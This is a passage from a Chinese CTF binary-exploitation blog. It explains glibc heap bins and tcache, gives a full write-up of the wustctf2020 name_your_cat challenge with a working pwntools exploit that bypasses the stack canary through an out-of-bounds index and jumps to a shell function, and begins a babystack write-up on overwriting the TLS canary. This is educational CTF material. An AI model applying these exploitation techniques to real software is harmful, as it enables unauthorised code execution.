punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;=</span> <span class="token operator">~</span>NONCONTIGUOUS_BIT<span class="token punctuation">)</span></span></span><span class="token comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the   arena.  Such an arena is no longer used to allocate chunks.  Chunks   allocated in that arena before detecting corruption are not freed.  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ARENA_CORRUPTION_BIT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">4U</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">arena_is_corrupt</span><span class="token expression"><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> ARENA_CORRUPTION_BIT<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_arena_corrupt</span><span class="token expression"><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">|=</span> ARENA_CORRUPTION_BIT<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>fastbinsY[NFASTBINS]</code><br>  存放每个 <code>fast chunk</code> 链表头部的指针</li><li><code>top</code><br>  指向分配区的 <code>top chunk</code></li><li><code>last_reminder</code><br>  最新的 <code>chunk</code> 分割之后剩下的那部分</li><li><code>bins</code><br>  用于存储 <code>unstored bin</code>，<code>small bin</code> 和 <code>large bin</code> 的 <code>chunk</code> 链表</li><li><code>binmap</code><br>  <code>ptmalloc2</code> 用 1 个 <code>bit</code> 来标识某一个 <code>bin</code> 中是否包含空闲 <code>chunk</code></li></ul><blockquote><p>注意：</p><p><code>main_arena</code> 的 <code>malloc_state</code> 并不是 <code>heap segment</code> 的一部分，而是一个全局变量，存储在 <code>libc.so</code> 的数据段</p></blockquote><hr><h2 id="bin-的种类"><a href="#bin-的种类" class="headerlink" title="bin 的种类"></a>bin 的种类</h2><blockquote><p>Glibc 为了让 <code>malloc</code> 可以更快找到合适大小的 <code>chunk</code>，用户 <code>free</code> 释放掉的 <code>chunk</code> 不会马上归还给系统，而是将该 <code>chunk</code> 根据大小加入到合适的 <code>bin</code> 中</p><p>当用户再一次通过 <code>malloc</code> 请求分配内存时，<code>ptmalloc2</code> 会试图在空闲的 <code>chunk</code> 中挑选一块合适的空间给用户，这样可以避免频繁的系统调用，降低内存分配的开销</p><p><mark><code>bin</code> 的中文意思为垃圾桶，就像要删除的文件会先放入 Windows 的回收站一样不会立即删除，很生动形象了</mark></p></blockquote><p><code>ptmalloc2</code> 会根据空闲的 <code>chunk</code> 的大小以及使用状态，将 <code>chunk</code> 初步放入相应的 <code>bin</code> 中，<code>bin</code> 的种类主要分为：</p><ul><li><code>fast bin</code></li><li><code>small bin</code></li><li><code>large bin</code></li><li><code>unsorted bin</code></li><li><code>tcache</code></li></ul><p>Glibc 提供了两个数组：<code>fastbinsY[]</code> 和 <code>bins[]</code> 用来存放这些 <code>bin</code></p><p>具体来说，可分为：</p><ul><li>10 个 <code>fast bin</code>，存储在 <code>fastbinsY[]</code> 中</li><li>1 个 <code>unsorted bin</code>，存储在 <code>bins[1]</code> 中</li><li>62 个 <code>small bin</code>，存储在 <code>bins[2]</code> 至 <code>bins[63]</code> 中</li><li>63 个 <code>large bin</code>，存储在 <code>bins[64]</code> 至 <code>bins[126]</code> 中</li></ul><p>其中虽然定义了 <code>bins[128]</code>，但是 <code>bins[0]</code> 和 <code>bins[127]</code> 其实是不存在的</p><p><code>chunk</code> 在 <code>bin</code> 上以链表的形式存放：（<code>fast bin</code> 是<strong>单链表</strong>，其他的 <code>bin</code> 都是<strong>双链表</strong>）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA10.png" alt="CTF - PWN_堆与堆溢出10.png"></p><hr><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><blockquote><p><code>fast bin</code> 非常像高速缓存 cache，为了减少一些较小的 <code>chunk</code> 在合并、分割以及中间检查的过程中的开销，<code>ptmalloc2</code> 中专门设计了 <code>fast bin</code>，对应的变量就是 <code>malloc state</code> 中的 <code>fastbinsY[]</code> 数组，用于提高小内存分配效率</p></blockquote><ul><li><code>fast bin</code> 存储在 <code>fastbinsY[]</code> 处，是 10 个<strong>单链表</strong>（最后 3 个链表保留未使用）</li><li><code>fast bin</code> 的 <code>chunk</code> 大小（含 <code>chunk</code> 头部）为：<code>16 ~ 64</code> 字节（64 位为 <code>32 ~ 128</code> 字节）</li><li>相邻 <code>bin</code> 存放的大小相差 8 字节（64 位为 16 字节）</li><li><strong>采取 <code>LIFO</code> 策略</strong>（最近释放的 <code>chunk</code> 会更早地被分配）</li><li><code>chunk</code> 的 <code>PREV_INUSE</code> 位（下一个物理相邻的 <code>chunk</code> 的 <code>P</code> 位）总为 1，释放到 <code>fastbin</code> 的 <code>chunk</code> 不会被清除 <code>PREV_INUSE</code> 标志位</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA11.png" alt="CTF - PWN_堆与堆溢出11.png"></p><p>如果遇到以下两种情况，<code>ptmalloc2</code> 会首先判断 <code>fast bin</code> 中相应的 <code>bin</code> 中是否有对应大小的空闲块，如果有的话，就会直接从这个 <code>bin</code> 中获取 <code>chunk</code>；如果没有的话，<code>ptmalloc2</code> 才会做接下来的一系列操作：</p><ul><li>在 32 位系统中（<code>SIZE_SZ = 4</code>），用户需要的 <code>chunk</code> 大小 &lt; 64 字节</li><li>在 64 位系统中（<code>SIZE_SZ = 8</code>），用户需要的 <code>chunk</code> 大小 &lt; 128 字节</li></ul><p>关于 <code>fast bin</code> 的大小定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">DEFAULT_MXFAST </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEFAULT_MXFAST</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> </span><span class="token comment">/* The maximum fastbin request size we support */</span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_FAST_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 32 位系统中，<code>fast bin</code> <strong>默认支持</strong>最大的 <code>chunk</code> 的数据空间大小为 64 字节：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">DEFAULT_MXFAST <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是其<strong>可以支持</strong>的 <code>chunk</code> 的数据空间最大为 80 字节：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">MAX_FAST_SIZE <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>fast bin</code> 最多可以支持的 <code>bin</code> 的个数为 10 个</strong>，在 32 位系统中，用户数据空间从第 8 字节开始一直到第 80 字节（不包括 <code>prev_size</code> 和 <code>size</code> 字段的 8 字节）</p><blockquote><p>注意：</p><p><strong>fast bin 中的 <code>chunk</code> 的 <code>PREV_INUSE</code> 位（下一个物理相邻的 chunk 的 P 位）始终被置为 1</strong>，因此它们不会和其它被释放的 <code>chunk</code> 合并，这也是为什么前面说 fast bin 是个特例，不会轻易合并</p><p>但是，当释放的 <code>chunk</code> 与该 <code>chunk</code> 相邻的空闲 <code>chunk</code> 合并后的大小 &gt; <code>FASTBIN_CONSOLIDATION_THRESHOLD</code> 时，说明内存碎片较多，此时就需要把 <code>fast bin</code> 中的 <code>chunk</code> 都进行合并，以减少内存碎片对系统的影响</p></blockquote><hr><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><blockquote><p><code>unsorted bin</code> 非常像缓冲区 buffer，可以视为空闲 <code>chunk</code> 回归其所属 <code>bin</code> 之前的缓冲区</p><p>大小超过 <code>fast bin</code> 阈值的 <code>chunk</code> 被释放时会加入到这里，这使得 <code>ptmalloc2</code> 可以复用最近释放的chunk，从而提升效率</p></blockquote><ul><li><code>unsorted bin</code> 处于 <code>bins[1]</code> 处，因此 <code>unsorted bin</code> 只有 1 个<strong>双向循环链表</strong></li><li><code>unsorted bin</code> 中的空闲 <code>chunk</code> 处于<strong>乱序状态</strong></li><li>**<code>unsorted bin</code> 在使用的过程中，采用的遍历顺序是 <code>FIFO</code>**（插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取）</li><li>在 <code>malloc</code> 分配时，如果在 <code>fast bin</code>、<code>small bin</code> 中找不到对应大小的 <code>chunk</code>，就会尝试从 <code>unsorted bin</code> 中寻找 <code>chunk</code>。如果取出来的 <code>chunk</code> 大小刚好满足，就会直接返回给用户；如果在 <code>unsorted bin</code> 中没有合适的 <code>chunk</code>，就会把 <code>unsorted bin</code> 中的所有 <code>chunk</code> 分别加入到所属的 <code>bin</code> 中，然后再在 <code>bin</code> 中分配合适的 <code>chunk</code></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA14.png" alt="CTF - PWN_堆与堆溢出14.png"></p><blockquote><p>当 <code>free</code> 的 <code>chunk</code> 大小 &gt;&#x3D; 144 字节时，为了效率，Glibc 并不会马上将 <code>chunk</code> 放到相对应的 <code>bin</code> 中，而会先放到 <code>unsorted bin</code></p><p>下次 <code>malloc</code> 时会先查找 <code>unsorted bin</code> 中是否有合适的 <code>chunk</code>，找不到才会去对应的 <code>bin</code> 中寻找，此时会顺便把 <code>unsorted bin</code> 的 <code>chunk</code> 放到对应的 <code>bin</code> 中，但 <code>small bin</code> 除外，为了效率，反⽽先从 <code>small bin</code> 找</p></blockquote><hr><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><blockquote><p><code>chunk size</code> 小于 <code>0x200</code> 字节（64 位为 <code>0x400</code> 字节）的 <code>chunk</code> 叫做 <code>small chunk</code>，而 <code>small bin</code> 存放的就是这些 <code>small chunk</code></p></blockquote><ul><li><code>small bin</code> 存储在 <code>bins[2]</code> 至 <code>bins[63]</code> 处，是 62 个<strong>双向循环链表</strong>（每个链表都有链表头结点，这样可以方便对于链表内部结点的管理）</li><li><code>fast bin</code> 的 <code>chunk</code> 大小（含 <code>chunk</code> 头部）为：<code>16 ~ 496</code> 字节（64 位为 <code>32 ~ 1008</code> 字节）</li><li>相邻 <code>bin</code> 存放的大小相差 8 字节（64 位为 16 字节）</li><li><em>每个链表中存储的 <code>chunk</code> 大小都一致</em></li><li><strong>采取 <code>FIFO</code> 策略</strong>（最近释放的 <code>chunk</code> 会被最后分配），这点和 <code>fast bin</code> 相反</li><li>同样与 <code>fast bin</code> 相反的是：<em>相邻的空闲 <code>chunk</code> 会被合并</em></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA12.png" alt="CTF - PWN_堆与堆溢出12.png"></p><p><code>small bin</code> 中每个 <code>chunk</code> 的大小与其所在的 <code>bin</code> 的 <code>index</code> 的关系为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">chunk_size <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">*</span> index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>small bin</code> 的大小再分成 62 个 <code>bin</code>，大小从 16 字节（64 位为 32 字节）开始，每次固定增加 8 字节（64 位为 16 字节）：</p><table><thead><tr><th>下标 index</th><th>SIZE_SZ&#x3D;4（32 位）</th><th>SIZE_SZ&#x3D;8（64 位）</th></tr></thead><tbody><tr><td>2</td><td>16</td><td>32</td></tr><tr><td>3</td><td>24</td><td>48</td></tr><tr><td>4</td><td>32</td><td>64</td></tr><tr><td>5</td><td>40</td><td>80</td></tr><tr><td><code>x</code></td><td><code>2 * 4 * x</code></td><td><code>2 * 8 * x</code></td></tr><tr><td>63</td><td>504</td><td>1008</td></tr></tbody></table><blockquote><p>注意：</p><p><code>fast bin</code> 中的 <code>chunk</code> 是有可能被放到 <code>small bin</code> 中去的</p></blockquote><hr><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><blockquote><p><code>large bin</code> 存放的是大于等于 <code>0x200</code> 字节（64 位为 <code>0x400</code> 字节）的 <code>chunk</code></p></blockquote><ul><li><code>large bin</code> 存储在 <code>bins[64]</code> 至 <code>bins[126]</code> 处，是 63 个<strong>双向循环链表</strong></li><li><em>每个 bin 中的 chunk 的大小不一致（按大小降序排列）</em></li><li><strong>采取 <code>FIFO</code> 策略</strong></li><li>插入和删除可以发生在任意位置</li><li>相邻空闲 <code>chunk</code> 会被合并</li></ul><p><code>large bin</code> 的 <code>freed chunk</code> 会多两个指针 <code>fd_nextsize</code>、<code>bk_nextsize</code>，分别指向前一块和后一块 <code>large chunk</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA13.png" alt="CTF - PWN_堆与堆溢出13.png"></p><p><code>large bin</code> 的大小再分成 63 个 <code>bin</code>，但大小不再是固定大小增加，而是按照公差分为 6 组：</p><table><thead><tr><th>组</th><th>bin 的数量</th><th>公差</th></tr></thead><tbody><tr><td>1</td><td>32</td><td>0x40</td></tr><tr><td>2</td><td>16</td><td>0x200</td></tr><tr><td>3</td><td>8</td><td>0x1000</td></tr><tr><td>4</td><td>4</td><td>0x8000</td></tr><tr><td>5</td><td>2</td><td>0x40000</td></tr><tr><td>6</td><td>1</td><td>不限制，大小和 large bin 剩余的大小相同</td></tr></tbody></table><hr><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><blockquote><p><code>tcache</code> 是 libc2.26（Ubuntu 17.10）之后引进的一种新机制，类似于 <code>fast bin</code> 一样的东西，目的是提升堆管理的性能，但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式</p></blockquote><ul><li>每条链上最多可以有 7 个 <code>chunk</code></li><li><code>malloc</code> 的时候优先去 <code>tcache</code> 找</li><li><code>free</code> 的时候当 <code>tcache</code> 满了才放入 <code>fastbin</code> 或 <code>unsorted bin</code></li></ul><p>基本工作方式：</p><ul><li><p><code>malloc</code> 时，会先 <code>malloc</code> 一块内存用来存放 <code>tcache_perthread_struct</code></p></li><li><p><code>free</code> 内存，且 <code>size</code> 小于 <code>small bin size</code> 时</p><ol><li>先放到对应的 <code>tcache</code> 中，直到 <code>tcache</code> 被填满（默认是 7 个）</li><li><code>tcache</code> 被填满之后，再次 <code>free</code> 的内存和之前一样被放到 <code>fast bin</code> 或者 <code>unsorted bin</code> 中</li><li><code>tcache</code> 中的 <code>chunk</code> 不会合并（不取消 <code>PREV_INUSE</code> 位）</li></ol></li><li><p><code>malloc</code> 内存，且 <code>size</code> 在 <code>tcache</code> 范围内</p><ol><li>先从 <code>tcache</code> 取 <code>chunk</code>，直到 <code>tcache</code> 为空</li><li><code>tcache</code> 为空后，从 <code>bin</code> 中找</li><li><code>tcache</code> 为空时，如果 <code>fast bin</code>、<code>small bin</code>、<code>unsorted bin</code> 中有 <code>size</code> 符合的 <code>chunk</code>，会先把 <code>fast bin</code>、<code>small bin</code>、<code>unsorted bin</code> 中的 <code>chunk</code> 放到 <code>tcache</code> 中，直到填满；之后再从 <code>tcache</code> 中取；因此 <code>chunk</code> 在 <code>bin</code> 中和 <code>tcache</code> 中的顺序会反过来</li></ol></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wustctf 2020】name_your_cat</title>
      <link href="/posts/35b1366d.html"/>
      <url>/posts/35b1366d.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><mark>利用数组下标越界实现绕过 Canary 修改栈上的返回值</mark></li></ul><hr><p><a href="https://buuoj.cn/challenges#wustctf2020_name_your_cat">【wustctf2020】name_your_cat</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看保护：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat1.png" alt="【wustctf2020】name_your_cat1.png"></p><p>在 IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat2.png" alt="【wustctf2020】name_your_cat2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat3.png" alt="【wustctf2020】name_your_cat3.png"></p><p>这里循环了 5 次，关键在于 <code>NameWhich()</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat4.png" alt="【wustctf2020】name_your_cat4.png"></p><p>在 <code>NameWhich()</code> 中首先让我们输入一个数存放到 <code>v2</code> 地址处，由于 <code>v2</code> 是一个数组，数组名代表数组第一个元素的地址，因此其实是让我们输入 <code>v2[0]</code> 的值</p><p>然后让我们输入一个最多 7 个字符的字符串存放在 <code>8 * v2[0] + a1</code> 地址处，由于 <code>a1</code> 是作为 char 型数组 <code>v3</code> 的形参，因此这里是让我们输入 <code>v3[8 * v2[0]]</code> 的值</p><p>存在一个后门函数 <code>shell()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat5.png" alt="【wustctf2020】name_your_cat5.png"></p><p>查看栈中的布局：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat6.png" alt="【wustctf2020】name_your_cat6.png"></p><p>由于存在 Canary，且没有其他的溢出点</p><p>但考虑到我们可以通过输入 <code>v3[8 * v2[0]]</code> 的值控制 <code>v3[]</code> 数组，同时程序没有对数组边界进行检查</p><p>因此我们可以使 <code>v3[]</code> 数组的下标越界，进而绕过 Canary 修改栈上的返回值</p><p><code>v3</code> 首地址距离栈上的返回地址 <code>0x34 + 0x4 = 0x38</code>，当 <code>v2[0] = 0</code> 时即对应 <code>v3</code> 的首地址</p><p>因此要修改返回地址的话，<code>v2[0]</code> 应该等于 <code>0x38 / 8 = 7</code></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./wustctf2020_name_your_cat"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./wustctf2020_name_your_cat"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">25944</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">NameWhich</span><span class="token punctuation">(</span>payload1<span class="token punctuation">,</span> payload2<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Give your name plz: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>        NameWhich<span class="token punctuation">(</span><span class="token string">b'0'</span><span class="token punctuation">,</span> <span class="token string">b'uf4te'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        NameWhich<span class="token punctuation">(</span><span class="token string">b'7'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{b953f0db-02fb-41e0-8b8e-11f9a74cc362}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat7.png" alt="【wustctf2020】name_your_cat7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Star Ctf 2018】babystack</title>
      <link href="/posts/11e500a1.html"/>
      <url>/posts/11e500a1.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>当溢出长度够大且程序创建了子线程时，可以通过修改 TLS 结构体中的 <code>stack_guard</code> 来控制 Canary</mark></p></li><li><p><mark>GDB 进行多线程的调试方法</mark></p></li><li><p><mark>通过 <code>read()</code> 将 one_gadget 写到 BSS 段上，然后利用栈迁移执行 one_gadget</mark></p></li><li><p>如果发现成功构造 <code>system(&quot;/bin/sh&quot;)</code> 后仍出现错误，尝试使用 one_gadget 或者 ret2syscall 构造 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 来 getshell</p></li></ul><hr><p><a href="https://buuoj.cn/challenges#starctf2018_babystack">【Star Ctf 2018】babystack</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看程序保护：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack1.png" alt="【starctf2018】babystack1.png"></p><p>已知 Glibc 版本为 2.27</p><p>尝试运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack2.png" alt="【starctf2018】babystack2.png"></p><p>IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack3.png" alt="【starctf2018】babystack3.png"></p><p>程序通过 <code>pthread_create(newthread, 0LL, start_routine, 0LL);</code> 创建了一个线程</p><blockquote><p>注意，关于线程函数的一点说明：</p><p><code>pthread_create</code> 用于创建一个线程，<code>pthread_join</code> 使一个线程等待另一个线程结束</p><p>如果没有 <code>pthread_join</code> 的话，主线程会很快结束从而使整个进程结束，创建的线程还没有机会执行整个线程就已经结束了</p><p>使用了 <code>pthread_join</code> 后，主线程会一直等待，直到等待的线程结束后主线程才会结束，使创建的线程有机会执行</p></blockquote><p>线程从 <code>start_routine()</code> 函数开始执行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack4.png" alt="【starctf2018】babystack4.png"></p><p>首先通过 <code>sub_400906()</code> 获取用户输入，这个输入表示我们想要发送多少字节的数据：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack5.png" alt="【starctf2018】babystack5.png"></p><p>这里的 <code>atol()</code> 函数将我们输入的字符串转换成一个长整数，返回给 <code>v2</code></p><p>如果 <code>v2 &lt;= 0x10000</code>，就调用 <code>sub_400957(0LL, s, v2);</code> 让我们向 <code>s</code> 中输入数据</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack6.png" alt="【starctf2018】babystack6.png"></p><p>注意到 <code>memset(s, 0, 0x1000uLL);</code> 为 <code>s</code> 初始化的空间长度为 <code>0x1000</code>，远远小于 <code>0x10000</code>，因此是存在溢出的</p><p>这里溢出的长度非常大，我们可以覆盖很多内容</p><p>由于 Canary 的生成是在程序的函数入口处从 GS 段（32 位）或 FS 段（64 位）内获取一个随机值，可以在 IDA 中看到对应位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B613.png" alt="CTF-PWN_Bypass安全机制13.png"></p><p>栈上的 Canary 的值其实来自于 TLS（Thread Local Storage），在 64 位程序中，TLS 由 FS 寄存器指向，因此这里的 <code>fs:28h</code> 其实是 Canary 在 TLS 中的偏移</p><blockquote><p>当程序创建线程的时候，会顺便创建一个 TLS 用来存储线程私有的数据，该 TLS 也会存储 Canary 的值，而 TLS 会保存在栈的高地址处 <strong>（这也是为什么说同一个进程中的不同线程的 Canary 是相同的）</strong></p></blockquote><p>因此，我们只要覆盖 TLS 中 Canary 的值，那么整个程序的 Canary 的值就是由我们来定的了</p><p>接下来就是动态调试确定偏移量了</p><blockquote><p>注意，这里涉及到多线程，需要进行多线程的 GDB 动态调试，如果不熟悉的话，可以看看本站《<a href="GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A8.md">GDB的基础和使用</a>》一文中的 <em>《pthread 多线程调试》</em> 部分</p></blockquote><p>为了便于我们调试，我们首先在子线程的 <code>start_routine()</code> 中下好断点：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">b *0x4009E7<span aria-hidden="true" 